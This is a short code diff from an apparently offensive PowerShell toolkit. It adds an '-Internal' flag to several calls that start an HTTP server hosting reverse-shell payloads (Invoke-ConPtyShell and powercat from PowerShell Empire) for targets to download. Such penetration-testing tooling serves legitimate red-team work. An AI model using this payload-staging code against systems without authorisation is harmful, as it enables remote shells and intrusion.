@@ -266,7 +266,7 @@ Performing the operation "Download File" on target "Destination: $extDir/Invoke-
                 # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
                 # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
                 if ( $Serve ) {
-                    Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty
+                    Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty -Internal
                 }
               }
               else {
@@ -281,7 +281,7 @@ Performing the operation "Download File" on target "Destination: $extDir/Invoke-
             # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
             # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
             if ( $Serve ) {
-                Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty
+                Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty -Internal
             }
           }
         }
@@ -299,10 +299,10 @@ Performing the operation "Download File" on target "Destination: $extDir/Invoke-
           # Spin up a Python HTTP server, hosting powercat.ps1 from its original location
           if ( $Serve ) {
               if ( !$Bind ) {
-                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -Shell powercat
+                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -Shell powercat -Internal
               }
               else {
-                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -PCB
+                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -PCB -Internal
               }
           }
         }
